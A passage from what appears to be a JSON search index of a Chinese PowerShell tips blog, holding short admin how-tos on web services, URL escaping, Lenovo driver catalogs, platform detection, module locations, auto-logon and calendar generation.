RSAT-AD-PowerShell","link":"/2021/11/23/enabling-active-directory-cmdlets/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 调用 COVID 服务","text":"您想及时了解 Covid 疫情数据吗？试试这个简单的 webservice： 123$result = Invoke-RestMethod -Uri &quot;https://coronavirus-19-api.herokuapp.com/countries&quot;$result -match &quot;Germany&quot; 结果类似于： country : Germany cases : 4480066 todayCases : 0 deaths : 95794 todayDeaths : 0 recovered : 4215200 active : 169072 critical : 1336 casesPerOneMillion : 53248 deathsPerOneMillion : 1139 totalTests : 73348901 testsPerOneMillion : 871788","link":"/2021/11/25/covid-webservice-with-powershell/"},{"title":"PowerShell 技能连载 - 使用 SOAP Webservice","text":"尽管 SOAP 尚未广泛用于公共的 Webservice（通常使用更简单的 REST 服务），但在内部，许多公司确实将 SOAP 用于他们的 Webservice。 PowerShell 具有出色的 SOAP 支持，因此您无需大量复杂的代码即可连接和使用 SOAP Webservice。这是少数剩余的免费公共 SOAP Webservice 之一（将德语“bankleitzahl”翻译成银行详细信息）： 12$o = New-WebServiceProxy -Uri http://www.thomas-bayer.com/axis2/services/BLZService?wsdl$o.getBank('25050180') 如您所见，要开始使用 SOAP Webservice，您需要 Webservice 提供的 WSDL URL。此网页以 XML 格式返回整个接口定义，New-WebServiceProxy 根据此信息创建包装 SOAP 数据类型所需的所有代码。 一旦您可以访问（任何）SOAP Webservice，您就可以使用以下代码来检查其方法： 1234567891011$o = New-WebServiceProxy -Uri http://www.thomas-bayer.com/axis2/services/BLZService?wsdl# common methods$blacklist = 'CreateObjRef', 'Dispose', 'Equals', 'GetHashCode', 'GetLifetimeService', 'InitializeLifetimeService', 'ToString', 'GetType'# exclude async and common methods$o | Get-Member -MemberType *method |Where-Object Name -notlike '*Async*' |Where-Object Name -notlike 'Begin*' |Where-Object Name -notlike 'End*' |Where-Object { $_.Name -notin $blacklist }","link":"/2021/11/29/using-soap-webservices/"},{"title":"PowerShell 技能连载 - 禁用摄像头","text":"寻求保护隐私吗？这是一个简短的脚本，用于在您的系统上查找已启用的摄像头，并让您禁用任何不想使用的摄像头： 1234 # find working cameras$result = Get-PnpDevice -FriendlyName *Camera* -Status OK -ErrorAction Ignore | Out-GridView -Title 'Select Camera Device To Disable' -OutputMode Single | Disable-PnpDevice -Confirm:$false -Passthru -whatif # remove -WhatIf to actually disable devices)","link":"/2021/12/01/disabling-webcams/"},{"title":"PowerShell 技能连载 - 检测挂起的重启","text":"下面的代码检测是否有挂起的重启： 12$rebootRequired = Test-Path &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending&quot;&quot;Pending reboot: $rebootRequired&quot;","link":"/2021/12/03/check-for-pending-reboot/"},{"title":"PowerShell 技能连载 - 修复 PowerShellGet 和 Publish-Module","text":"Publish-Module 是一个 cmdlet，用于将模块发布（上传）到 NuGet 仓库。有时，此 cmdlet 会引发奇怪的异常。这种情况下的原因是 nuget.exe 的过时版本。该应用程序负责打包一个模块并保存为.nupkg 文件，并且在您第一次使用 Publish-Module 时会自动下载该应用程序。 要更正此问题并刷新您的 nuget.exe 版本，请运行以下命令： 1Invoke-WebRequest -Uri https://dist.nuget.org/win-x86-commandline/latest/nuget.exe -OutFile &quot;$env:LOCALAPPDATA\\Microsoft\\Windows\\PowerShell\\PowerShellGet\\NuGet.exe&quot; 确保在此之后关闭并重新启动所有 PowerShell 会话。如果 Publish-Module 仍然拒绝工作，您可能需要运行以下命令（需要管理员权限）： 1Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force","link":"/2021/12/07/repair-powershellget-and-publish-module/"},{"title":"PowerShell 技能连载 - Out-GridView 自定义列","text":"当您使用 -OutputMode 或 -PassThru 参数时，Out-GridView 可以是一个通用对话框。执行此操作时，网格视图窗口会在其右下角显示其他按钮，以便您可以选择项目并将它们传递给其他 cmdlet。 此行代码可以帮助选择要停止的服务，例如： 1Get-Service | Where-Object CanStop | Out-GridView -Title 'Service to stop?' -OutputMode Single | Stop-Service -WhatIf 但是，Out-GridView 无法控制它显示的属性。在上面的示例中，用户实际上只需要查看服务名称以及可能的依赖服务。 当然，您可以使用 Select-Object 来选择要显示的属性。现在网格视图窗口将准确显示您要求的列，但由于您永久删除了所有其他属性并更改了对象类型，后续 cmdlet 可能会如你所想的不能正常工作： 1Get-Service | Where-Object CanStop | Select-Object -Property DisplayName, DependentServices | Out-GridView -Title 'Service to stop?' -OutputMode Single | Stop-Service -WhatIf 运行上面这行代码时，网格视图窗口现在看起来很棒，但 Stop-Service 将不再停止选择您选择的服务，因为 Select-Object 将对象类型从 Service 更改为自定义对象： Stop-Service : The specified wildcard character pattern is not valid: @{DisplayName=Windows Audio Endpoint Builder; DependentServices=System.ServiceProcess.ServiceController[]} 在上一个技能中，我们已经使用了一种隐藏的技术，您可以使用它来告诉 Out-GridView 它应该显示哪些列——无需删除任何属性或更改对象类型： 1234567891011121314# create object that tells PowerShell which column(s) should be visible:# show &quot;DisplayName&quot;, and &quot;DependentServices&quot;[string[]]$visible = 'DisplayName', 'DependentServices'$type = 'DefaultDisplayPropertySet'[System.Management.Automation.PSMemberInfo[]]$info =[System.Management.Automation.PSPropertySet]::new($type,$visible)Get-Service | Where-Object CanStop | # add the secret object to each object that you pipe into Out-GridView: Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $info -PassThru | Out-GridView -Title 'Service to stop?' -OutputMode Single | Stop-Service -WhatIf 不幸的是，当您这样做时，您可能会遇到红色错误消息。某些 PowerShell 对象（例如 Service）已经使用了我们尝试添加的巧妙技巧，因此您无法覆盖 PSStandardMembers 属性。要解决此问题，只需通过 Select-Object * 运行它们来克隆对象： 12345678910111213141516# create object that tells PowerShell which column(s) should be visible:# show &quot;DisplayName&quot;, and &quot;DependentServices&quot;[string[]]$visible = 'DisplayName', 'DependentServices'$type = 'DefaultDisplayPropertySet'[System.Management.Automation.PSMemberInfo[]]$info =[System.Management.Automation.PSPropertySet]::new($type,$visible)Get-Service | Where-Object CanStop | # clone the objects so they now belong to you: Select-Object -Property * | # add the secret object to each object that you pipe into Out-GridView: Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $info -PassThru | Out-GridView -Title 'Service to stop?' -OutputMode Single | Stop-Service -WhatIf 现在一切都很神奇，Out-GridView 仅显示您选择的属性。尽管如此，Stop-Process 继续获得输出信息并停止您选择的服务（删除 -WhatIf 来真实地停止服务，请确保您有管理员权限进行此操作）。 虽然通过 Select-Object 运行对象确实会更改其对象类型，但大多数 cmdlet 仍会继续处理这些对象，因为它们仍包含所有属性。这是最后一个示例：即使 Out-GridView 仅显示您选择的属性，对象仍包含所有属性，包括隐藏在网格视图窗口中的属性： 123456789101112131415161718# create object that tells PowerShell which column(s) should be visible:# show &quot;Name&quot;, &quot;Description&quot; and &quot;MainWindowTitle&quot;[string[]]$visible = 'Name', 'Description', 'MainWindowTitle'$type = 'DefaultDisplayPropertySet'[System.Management.Automation.PSMemberInfo[]]$info =[System.Management.Automation.PSPropertySet]::new($type,$visible)Get-Process | Where-Object MainWindowTitle | Sort-Object -Property Name | # clone the objects so they now belong to you: Select-Object -Property * | # add the secret object to each object that you pipe into Out-GridView: Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $info -PassThru | Out-GridView -Title 'Select a process' -OutputMode Single | # still all properties available: Select-Object -Property *","link":"/2021/12/27/out-gridview-with-custom-columns/"},{"title":"PowerShell 技能连载 - 自动化下载联想驱动程序（第 1 部分）","text":"许多硬件供应商提供基于 Web 的自助服务门户。以下是 Lenovo 返回有关驱动程序和其他更新下载的详细信息的示例： https://download.lenovo.com/cdrt/tools/drivermatrix/dm.html 如果您需要管理成百上千台机器或需要定期查找信息，您当然希望自动化此资源。典型的第一种方法是检查 HTML 源代码并搜索 Web 服务，或者如果一切都失败了，则使用 Invoke-RestMethod 和 session cookie 来发送表单数据并模仿用户输入。 这不仅复杂，甚至可能完全失败。例如，Lenovo 网站使用 Javascript 编写 Web 前端，因此 PowerShell 和 Invoke-RestMethod 此时起不了作用。您必须使用基于 Selenium 的测试浏览器或其他高级 Web 浏览器自动化。 但是，当您仔细查看 HTML 源代码时，您可能会遇到这样的代码： 1$.get(&quot;../../../catalog/&quot; + x + &quot;_&quot; + document.getElementById(&quot;os&quot;).value + &quot;.xml&quot;, function(data, status) 显然，网站上显示的数据来自静态 XML 文件，因此实际上不需要对 Web 界面进行自动化操作。在这种情况下，您只需要知道这些 XML 文件的命名方式。 这是包装这些 XML 文档的 PowerShell 函数。它返回所有型号的 Lenovo 驱动程序信息，并且是完全自动化的： 12345678910111213141516171819202122232425262728293031323334353637383940414243function Get-LenovoDriver{ param ( $Model = '20JN', $Os = 'Win7', $Category = '*' ) $url = &quot;https://download.lenovo.com/catalog/${model}_$os.xml&quot; $info = $model, $os $url = &quot;https://download.lenovo.com/catalog/{0}_{1}.xml&quot; -f $info $xml = Invoke-RestMethod -Uri $url -UseBasicParsing $data = [xml]$xml.Substring(3) [xml]$data = $xml.Substring(3) $data.packages.package | Where-Object { $_.Category -like $Category } | ForEach-Object { $location = $_.location $name = $_.category $rohdaten = Invoke-RestMethod -Uri $location -UseBasicParsing [xml]$info = $rohdaten.Substring(3) $filename = $info.Package.Files.Installer.File.Name [PSCustomObject]@{ Category = $name Command = $info.package.ExtractCommand Space = $info.package.DiskspaceNeeded Reboot = $info.package.Reboot.type Version = $info.package.version Download = &quot;https://download.lenovo.com/pccbbs/mobiles/$filename&quot; Datum = Get-Date } }} 您现在可以直接从 PowerShell 命令行检索信息，而不是手动操作 HTML 页面，例如： 12345678910PS&gt; Get-LenovoDriver -Model 20JN -Os Win10 | Out-GridView -PassThruCategory : ThinkVantage TechnologyCommand : n1msk20w.exe /VERYSILENT /DIR=%PACKAGEPATH% /EXTRACT=&quot;YES&quot;Space : 33206066Reboot : 3Version : 1.82.0.20Download : https://download.lenovo.com/pccbbs/mobiles/n1msk20w.exeDatum : 09.12.2021 13:16:00 即使您不管理 Lenovo 硬件，您也可以复用此示例中介绍的一些技术。","link":"/2021/12/29/automating-lenovo-driver-downloads-part-1/"},{"title":"PowerShell 技能连载 -  自动化下载联想驱动程序（第 2 部分）","text":"在前面的示例中，我们说明了如何从 Web 抓取联想驱动程序信息。在此示例中，返回的一些信息是原始数字信息：例如，表示 “3” 表示需要重启。 在这个技能中，我们想展示如何幻数 (cryptic numeric values) 转换为友好的文本。首先，让我们来看看改进的 Lenovo 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function Get-LenovoDriver{ param ( $Model = '20JN', $Os = 'Win7', $Category = '*' ) $restartText = @{ '0' = &quot;No restart&quot; '1' = &quot;Forced restart&quot; '3' = &quot;Restart required&quot; '4' = &quot;Shutdown after install&quot; } $url = &quot;https://download.lenovo.com/catalog/${model}_$os.xml&quot; $info = $model, $os $url = &quot;https://download.lenovo.com/catalog/{0}_{1}.xml&quot; -f $info $xml = Invoke-RestMethod -Uri $url -UseBasicParsing $data = [xml]$xml.Substring(3) [xml]$data = $xml.Substring(3) $data.packages.package | Where-Object { $_.Category -like $Category } | ForEach-Object { $location = $_.location $name = $_.category $rohdaten = Invoke-RestMethod -Uri $location -UseBasicParsing [xml]$info = $rohdaten.Substring(3) $filename = $info.Package.Files.Installer.File.Name $readme = [System.IO.Path]::ChangeExtension($filename, 'txt') $readme = $info.Package.Files.Readme.file.Name [PSCustomObject]@{ Category = $name Command = $info.package.ExtractCommand Space = $info.package.DiskspaceNeeded SpaceMB = [Math]::Round( ($info.package.DiskspaceNeeded / 1MB), 1) Reboot = $info.package.Reboot.type RebootFriendly = $restartText[$info.package.Reboot.type] Version = $info.package.version Download = &quot;https://download.lenovo.com/pccbbs/mobiles/$filename&quot; ReadMe = &quot;https://download.lenovo.com/pccbbs/mobiles/$readme&quot; Datum = Get-Date } }} 您现在可以通过以下方式获取有关任何 Lenovo 机器的任何驱动程序更新的信息： 12345678910111213PS C:\\&gt; Get-LenovoDriver -Model 20JN -Os Win10 | Out-GridView -PassThruCategory : Camera and Card ReaderCommand : n1qib04w.exe /VERYSILENT /DIR=%PACKAGEPATH% /EXTRACT=&quot;YES&quot;Space : 6442356SpaceMB : 6,1Reboot : 1RebootFriendly : Forced restartVersion : 3760Download : https://download.lenovo.com/pccbbs/mobiles/n1qib04w.exeReadMe : https://download.lenovo.com/pccbbs/mobiles/n1qib04w.txtDatum : 09.12.2021 13:21:21 属性 “Reboot“ 显示原始的幻数。 新属性 ““RebootFriendly”“ 则用友好的文本表示，在这个例子中是 “Forced restart”。 让我们解读一下源代码来了解转换的过程。 对于任何转换过程，您需要准备一个哈希表，该表将幻数映射到友好的文本： 123456$restartText = @{ '0' = &quot;No restart&quot; '1' = &quot;Forced restart&quot; '3' = &quot;Restart required&quot; '4' = &quot;Shutdown after install&quot; } 接下来，将数值转换为文本，与查找哈希表值一样简单： 1234...Reboot = $info.package.Reboot.typeRebootFriendly = $restartText[$info.package.Reboot.type]...","link":"/2021/12/31/automating-lenovo-driver-downloads-part-2/"},{"title":"PowerShell 技能连载 - Windows 重启后自动登录","text":"如果您的自动化脚本需要重新启动机器，并且您希望在重新启动后自动登录，那么以下是一个快速的脚本，它将登录凭据保存到 Windows 注册表： 12345678910111213# ask for logon credentials:$cred = Get-Credential -Message 'Logon automatically'$password = $cred.GetNetworkCredential().Password$username = $cred.UserName# save logon credentials to registry (WARNING: clear text password used):$path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;Set-ItemProperty -Path $path -Name AutoAdminLogon -Value 1Set-ItemProperty -Path $path -Name DefaultPassword -Value $passwordSet-ItemProperty -Path $path -Name DefaultUserName -Value $username# restart machine and automatically log on: (remove -WhatIf to test-drive)Restart-Computer -WhatIf 如果您希望每次计算机启动时自动登录，那么可以使用相同的方法。 显然，此技术可能会增加安全风险：密码以明文的方式写入注册表。请只在合适的地方谨慎使用它。","link":"/2022/01/04/auto-logon-after-windows-reboot/"},{"title":"PowerShell 技能连载 - 动态生成 IntelliSense.","text":"在设计 PowerShell 函数时，您可以通过添加智能参数完成 IntelliSense 来提高可用性。 要编写某个参数的 IntelliSense 自动完成，您可以使用动态生成 IntelliSense 列表的 PowerShell 代码来填充函数的每个参数。当然，您使用的代码应该能快速计算出结果，IntelliSense 才不会超时。 如果需要将方法（命令）添加到对象，请通过 Add-Member 添加它们： 123456789101112131415161718192021222324function Get-MyLocalUser{ #Content param ( [String] [Parameter(Mandatory)] [ArgumentCompleter({ # receive information about current state: param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters) Get-LocalUser | ForEach-Object { $name = $_.Name $desc = $_.Sid # showing SID as QuickTip [System.Management.Automation.CompletionResult]::new($name, $name, &quot;ParameterValue&quot;, $desc) } })] $UserName ) &quot;You chose $UserName&quot;} 运行代码后，在交互式控制台中键入： 1PS&gt; Get-MyLocalUser -UserName 在 -UnerName 后按下空格，IntelliSense 介入并显示所有本地用户名。当您选择一个 IntelliSense 项目时，QuickTip 会显示用户的 SID。 此智能参数完成在 [ArgumentCompleter()] 属性中定义。 它内部的代码生成了 CompletionResult 对象，每个对象对应一个 IntelliSense 列表项。","link":"/2022/01/06/dynamically-composed-intellisense/"},{"title":"PowerShell 技能连载 - 转义 URL 字符串","text":"将字符串信息添加到 URL 时，即要构造用于调用 REST Web 服务的请求时，重要的一环是要转义特殊字符。[Uri] 类型为 URL 提供了转义与反转义方法： 123$Text = 'SOS Save me please!'$Escaped = [Uri]::EscapeUriString($Text)$Escaped 结果如下所示： SOS%20Save%20me%20please! 现在，您可以安全地将转义的字符串数据发送到 RESTful Web 服务。以下代码将文本转换为摩尔斯码： 12345678$Text = 'SOS Save me please!'$url = &quot;https://api.funtranslations.com/translate/morse.json?text=$Text&quot;$Escaped = [Uri]::EscapeUriString($url)$result = Invoke-RestMethod -Uri $url$result.contents.translated 结果现在看起来像这样： ... --- ... ... .- ...- . -- . .--. .-.. . .- ... . ---. 有些时候，使用此方法转义字符串可能会破坏某些查询字符串。要解决这个问题，请查看明天的技能。","link":"/2022/01/10/escaping-strings-in-urls/"},{"title":"PowerShell 技能连载 - 安全地转义数据字符串","text":"通常，您使用像 EscapeUriString() 这样的方法来安全地转义要追加到 URL 的字符串数据（如我们之前的技能中所指出的）。 但是，这可能会导致头疼的情况，因为 EscapeUriString() 专门设计用于转义包括域名部分的完整URL，而不仅仅是您的参数。这就是为什么它可能损坏您要发送给其他人的数据，即莫尔斯 Web Service。尝试运行以下代码： 123456$url = &quot;https://api.funtranslations.com/translate/morse.json?text=One&amp;Two&quot;$Escaped = [Uri]::EscapeUriString($url)$result = Invoke-RestMethod -Uri $url$result.contents 返回的结果可以看出问题： translated text translation ---------- ---- ----------- --- -. . One morse 即使您将文本 “One&amp;Two” 发送给 WebService，它也仅会返回 “One” 的摩尔斯代码。当您查看 $Escaped 的内容时，就能发现原因： 12PS C:\\&gt; $escapedhttps://api.funtranslations.com/translate/morse.json?text=One&amp;Two EscapeUriString 没有将 &amp; 字符转义——因为 &amp; 是URL的有效部分，它用于分割参数。实质上，WebService 接收了两个参数，因为它只支持一个，所以它丢弃了第二个参数。 虽然 EscapeUriString() 能很方便快速转义完整的网址，但它具有严重的缺点。要解决此问题，请务必确保将 base URL 和数据参数分开。您可以使用 EscapeDataString()，来代替 EscapeUriString() 来确保所有特殊字符被正确转义： 1234567$Text = 'One&amp;Two'$Escaped = [Uri]::EscapeDataString($Text)$baseurl = &quot;https://api.funtranslations.com/translate/morse.json?text=&quot;$url = $baseurl + $Escaped$resultok = Invoke-RestMethod -Uri $url$resultok.contents 现在结果是正确的（用于演示的 WebService 确实具有速率限制，因此如果您过于频繁调用它，将需要等待一小时来验证）： 这是因为 $escaped 现在转义了所有特殊字符，包括 ＆ 符号： 12PS&gt; $escapedOne%26Two 此外，您还有一张“返程票：UnescapeDataString()，它能将转义后的数据恢复正常： 123456789# escape special characters$text = 'This is a text with [special] characters!'$escaped = [Uri]::EscapeDataString($text)$escaped# unescape escaped strings$unescaped = [Uri]::UnescapeDataString($escaped)$unescaped 结果如下所示： This%20is%20a%20text%20with%20%5Bspecial%5D%20characters%21 This is a text with [special] characters!","link":"/2022/01/12/safely-escaping-data-strings/"},{"title":"PowerShell 技能连载 - 转义独立的字符","text":"在前一个技能中，我们解释了如何转义整个字符串序列。如果您只需要转义单个字符，请使用 HexEscape() 如： 12PS&gt; [Uri]::HexEscape('a')%61 此方法实际上是检索 ASCII 代码并将其转换为十六进制。 实际上，还可以进行相反的操作，您可以将转义的字符转换回正常字符。例如，”a” 的 ASCII 代码为 65，它的十六进制表达是 41。因此，”A” 的转义表示为 “％41”，这行代码将得到 “A”： 12PS C:\\&gt; [Uri]::HexUnescape('%41',[ref]0)A （第二个参数表示要转换转义的字符在字符串中的位置）。 有了这个，您现在可以生成一个范围内的字母：首先，生成所需字母的 ASCII 代码，并以十六进制形式手动转换它们。-f 运算符可以执行此转换： 1234PS&gt; $decimal = 65PS&gt; $hex = '{0:X}' -f $decimalPS&gt; $hex41 以下是来自 A 到 Z 的转义字母： 165..90 | ForEach-Object { '%{0:X}' -f $_ } 反转义它们的方法： 165..90 | ForEach-Object { [Uri]::HexUnescape( ('%{0:X}' -f $_), [ref]0) } 不过，不要爱上这个过度的技巧。类型转换可以让您更轻松实现： 1[char[]](65..90)","link":"/2022/01/14/escaping-individual-characters/"},{"title":"PowerShell 技能连载 - 决定您的平台","text":"现在的 PowerShell 已是跨平台的，因此即使能在 Windows 服务器上正常使用 Windows PowerShell，您的脚本也有可能在不同的操作系统上停止运行。 如果您的脚本想要知道它正在运行的平台，以向后兼容的方式运行，请尝试这些代码： 12345$RunOnWindows = (-not (Get-Variable -Name IsWindows -ErrorAction Ignore)) -or $IsWindows$RunOnLinux = (Get-Variable -Name IsLinux -ErrorAction Ignore) -and $IsLinux$RunOnMacOS = (Get-Variable -Name IsMacOS -ErrorAction Ignore) -and $IsMacOSGet-Variable -Name RunOn* 在 Windows 系统上，结果如下所示： Name Value ---- ----- RunOnLinux False RunOnMacOS False RunOnWindows True 您现在可以安全地检查先决条件，并确保您的脚本代码仅在适当的情况下运行。","link":"/2022/01/18/determining-your-platform/"},{"title":"PowerShell 技能连载 - 是否在 Windows PowerShell 中运行（第 1 部分）","text":"现在的 PowerShell 可以在各种平台上运行，并且在上一个技能中，我们解释了如何查看脚本运行的操作系统。 如果操作系统是 Windows，您仍然不能知道您的脚本是由内置 Windows PowerShell 还是新的便携式 PowerShell 7 运行。 以下是一种安全和向后兼容的方式，可以了解您的脚本是否在 Windows PowerShell 上运行： 1234$RunOnWPS = !($PSVersionTable.ContainsKey('PSEdition') -and $PSVersionTable.PSEdition -eq 'Core')&quot;Runs on Windows PowerShell? $RunOnWPS&quot;","link":"/2022/01/20/running-on-windows-powershell-or-not-part-1/"},{"title":"PowerShell 技能连载 - 是否在 Windows PowerShell 中运行（第 2 部分）","text":"在上一个技能中，我们介绍了一个向后兼容的单行代码，能够判断您的脚本是否运行在传统的 Windows PowerShell 环境中，还是运行在新的 PowerShell 7 便携版 shell 中。 如果您使用的是跨平台的 PowerShell 7，那么有一个名为 [Management.Automation.platform] 的新类型，能返回更多的平台信息。Windows PowerShell 尚未包含此类型，因此您可以使用此类型来确定您是否当前正在 Windows PowerShell 上运行。如果没有，则该类型提供了额外的平台信息： 1234567891011121314# testing whether type exists$type = 'Management.Automation.Platform' -as [Type]$isWPS = $type -eq $nullif ($isWPS){ Write-Warning 'Windows PowerShell'} else { # query all public properties $properties = $type.GetProperties().Name $properties | ForEach-Object -Begin { $hash = @{} } -Process { $hash[$_] = $type::$_ } -End { $hash }} 在 Windows PowerShell 上，脚本只会产生警告。 在 PowerShell 7 上，它返回一个哈希表，其中包含所有相关平台信息： Name Value ---- ----- IsStaSupported True IsLinux False IsCoreCLR True IsWindows True IsNanoServer False IsMacOS False IsWindowsDesktop True IsIoT False","link":"/2022/01/24/running-on-windows-powershell-or-not-part-2/"},{"title":"PowerShell 技能连载 - 测试 URL 是否完整","text":"PowerShell 经常基于 API，您不需要深入正则表达式和文本模式。相反，.NET Framework 中可以使用多种专业的测试方法。困难的是找到并知道它们，而不是运行它们和进行测试。 例如，要测试 URL 是否正确，请尝试： 123$url = 'powershell.one'$kind = [UriKind]::Absolute[Uri]::IsWellFormedUriString($url, $kind) 结果将是 false ，因为 “powershell.one” 不是一个绝对的 URL。在前面添加 “https://“，结果会变为 true。","link":"/2022/01/26/testing-well-formed-urls/"},{"title":"PowerShell 技能连载 - 识别主 PowerShell 模块位置","text":"PowerShell 只是一个脚本引擎。 其所有 cmdlet 来自外部模块，环境变量 $env:PSModulePath 返回 PowerShell 自动扫描模块的文件夹： 1234PS&gt; $env:PSModulePath -split ';'C:\\Users\\username\\Documents\\WindowsPowerShell\\ModulesC:\\Program Files\\WindowsPowerShell\\ModulesC:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules 同样，Get-Module 查找位于其中一个文件夹中的所有模块和 cmdlet： 1Get-Module -ListAvailable 当您以专家的身份使用 PowerShell 时，确保所有所需的模块（以及其 cmdlet）都可以使用，将越来越重要。因此，第一步是选择一个好的位置来存储新模块，下一步是良好地部署和更新这些模块。 本地存储模块的最佳位置是代表 “AllUsers” 范围的文件夹。在 Windows 系统上，此文件夹位于 Program Files 中，您需要管理员权限来更改它。 在大型企业中部署和更新模块的最佳方法是使用现有的软件部署基础架构和部署模块及其更新，以及之前识别的 “AllUsers” 文件夹。 该文件夹的路径可能会根据您使用的 PowerShell 版本而异。以下是一个脚本，用于计算所有用户的模块位置的路径： 1234567891011121314151617181920# determine the primary module location for your PowerShell version$path = if ('Management.Automation.Platform' -as [Type]){ # PowerShell CLR if ([Environment]::OSVersion.Platform -like 'Win*' -or $IsWindows) { # on Windows Join-Path -Path $env:ProgramFiles -ChildPath 'PowerShell' } else { # on Non-Windows $name = [Management.Automation.Platform]::SelectProductNameForDirectory('SHARED_MODULES') Split-Path -Path $name -Parent }}else{ # Windows PowerShell Join-Path -Path $env:ProgramFiles -ChildPath &quot;WindowsPowerShell&quot;} 在 Windows 上，PowerShell 7 和 Windows PowerShell 可以共享一个文件夹，因此如果您不想专门为 PowerShell 7 部署模块，则可以进一步简化脚本： 1234567891011121314# determine the primary module location for your PowerShell version$path = if ([Environment]::OSVersion.Platform -like 'Win*' -or $IsWindows){ # Windows Join-Path -Path $env:ProgramFiles -ChildPath &quot;WindowsPowerShell&quot;}else{ # Non-Windows $name = [Management.Automation.Platform]::SelectProductNameForDirectory('SHARED_MODULES') Split-Path -Path $name -Parent}$path","link":"/2022/01/28/identifying-primary-powershell-module-location/"},{"title":"PowerShell 技能连载 - 查看所有模块的细节","text":"powershellgallery.com 是找到新的免费 PowerShell 扩展模块的好地方，可以为您的 PowerShell 添加新的 cmdlet。 但是，在 Web 界面中查看所有模块详细信息可能会有点麻烦。这就是为什么通过 RESTful WebService 检索模块信息可能会有所帮助。 这是一个脚本，它传入 PowerShell Gallery 中托管的（任何）模块的名称。然后，它检索所有详细信息（例如版本历史记录、下载计数、更新日期和发行说明），并以一种使信息易于访问的方式准备它们。特别是，将检索到的基于 XML 的信息转换为简单对象： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# replace module name with any module name hosted# in the PowerShell Gallery (https://powershellgallery.com)$ModuleName = 'MicrosoftTeams'$baseUrl = 'https://www.powershellgallery.com/api/v2/FindPackagesById()?id='$escaped = [Uri]::EscapeDataString(&quot;'$ModuleName'&quot;)$url = $baseUrl + $escaped# properties to exclude (add or remove as needed)$blacklist = 'FileList', 'Tags'$data = Invoke-RestMethod -Uri $url -UseBasicParsing |ForEach-Object { $hash = [Ordered]@{} $moduleInfo = $_.Properties foreach($_ in $moduleInfo.PSObject.Properties) { # name of property $name = $_.Name # if it is in blacklist, skip and continue with next property if ($name -in $blacklist) { continue }# if it is the property &quot;name&quot;, then skip# all remaining (xml default properties) if ($name -eq 'Name') { break } # if type is &quot;xmlelement&quot;, retrieve underlying text value in #text if ($_.TypeNameOfValue -eq 'System.Xml.XmlElement') { $hash[$name] = $moduleInfo.$name.'#text' # if a datatype is assigned, try and convert to appropriate type if ($moduleInfo.$name.type -like 'Edm.*') { $typename = $moduleInfo.$name.type.replace('Edm.','') $hash[$name] = $hash[$name] -as $typename } } else { $hash[$name] = $_.Value } } # convert a hash table to object and return it [PSCustomObject]$hash}$data | Out-GridView","link":"/2022/02/01/view-all-module-details/"},{"title":"PowerShell 技能连载 - 打开关闭 Windows 的对话框","text":"以下是打开关闭 Windows 对话框的一行代码： 1(New-Object -ComObject Shell.Application).ShutdownWindows() 使用此行代码，它变成了名为 “bye” 的新命令： 1function bye { (New-Object -ComObject Shell.Application).ShutdownWindows() } 如果将此行放在 $profile 中的自动配置文件 (start) 脚本中（可能需要先创建该文件），则完成脚本时，您现在可以简单地输入 “bye” 以关闭您的 Windows 会话。","link":"/2022/02/03/10-open-windows-shutdown-dialog/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 创建日历电子表格","text":"是否需要计划为您的俱乐部，社区或爱好进行重复的会议吗？当然，有很多在线工具可以帮助您，但如果您想在 Microsoft Excel 中创建日历列表，PowerShell 可以是一个优秀的帮手。 让我们假设您每周三都有一次重复的会议，会议在下午十二点开始，除了每个月的最后一周。 您可以这样使用 PowerShell，而不是将这些日期和时间手动添加到 Excel 表： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# generate calendar for weekly incidents$startdate = [DateTime]'2022-06-01'$numberOfWeeks = 52$result = for ($week = 0; $week -lt $numberOfWeeks; $week ++){ # calculate the real date each week $realdate = $startdate + (New-Timespan -days (7*$week)) # calculate the current month $month = $realdate.Month # calculate the days in this month $daysInMonth = [DateTime]::DaysInMonth($realdate.Year, $realdate.Month) # make arbitrary adjustments, i.e. set start time to 12PM by default, but 7PM on the last week of a month # are we in the last week of a month? if ($realdate.Day -gt ($daysInMonth-7)) { # add 19 hours $realdate = $realdate.AddHours(19) } else { # add 12 hours $realdate = $realdate.AddHours(12) } # create your Excel sheet layout as a CSV file [PSCustomObject]@{ Start = $realdate IsOnline = $false Title = '' Speaker = '' Notes = '' }}$path = &quot;$env:temp\\calendar.csv&quot;$result | Export-Csv -UseCulture -Path $path -Encoding UTF8 -NoTypeInformation# open CSV in ExcelStart-Process -FilePath excel -ArgumentList $path 此脚本使用了许多有用的技术： 在循环中使用偏移量来构建日期（在此示例中是 7 天，可以轻松调整成任何其他间隔） 通过计算当前月份的天数来识别“该月的最后一周”，然后根据此计算日期进行调整 在 Microsoft Excel 中生成 CSV 数据和打开 CSV（如果已安装）","link":"/2022/02/07/creating-calendar-spreadsheets-with-powershell/"},{"title":"PowerShell 技能连载 - 计算第几周（第 1 部分）","text":"计算第几周不是一件很容易的事，并且根据文化不同而不同。以下是一个计算任何日期是第几周的方法： 12345678910# calculate day of week# adjust calendar specs to your culture$Date = [DateTime]'2021-12-31'$CalendarWeekRule = [System.Globalization.CalendarWeekRule]::FirstDay$FirstDayOfWeek = [System.DayOfWeek]::Monday$week = [System.Globalization.DateTimeFormatInfo]::CurrentInfo.Calendar.GetWeekOfYear( $date, $calendarWeekRule, $firstDayOfWeek )&quot;$date = week $week&quot; 只需确保您按照当地文化调整了日历的周规则和一周的第一天。 前面的示例使用当前的文化日历。如果您想控制文化，请尝试使用这种方法： 12345678910$Date = [DateTime]'2022-12-31'$CultureName = 'de-de'$CalendarWeekRule = [System.Globalization.CalendarWeekRule]::FirstDay$FirstDayOfWeek = [System.DayOfWeek]::Monday$culture = [System.Globalization.CultureInfo]::GetCultureInfo($CultureName)$week = $culture.Calendar.GetWeekOfYear($Date, $CalendarWeekRule, 